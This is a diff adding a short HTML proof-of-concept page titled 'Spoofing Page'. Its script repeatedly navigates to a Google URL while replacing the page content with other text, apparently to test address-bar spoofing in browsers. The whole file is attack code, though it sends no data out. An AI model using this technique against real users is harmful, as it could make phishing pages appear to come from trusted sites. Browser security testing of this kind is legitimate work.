@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>Spoofing Page</title>
+        <script>
+            function spoof() {
+                location = "https://www.google.com/csi?random=" + Math.random();
+                document.body.innerHTML = 'This is not Google!';
+            }
+        </script>
+    </head>
+    <body>
+        <input type="button" value="Run" onclick="setInterval('spoof()', 20);"/>
+    </body>
+</html>
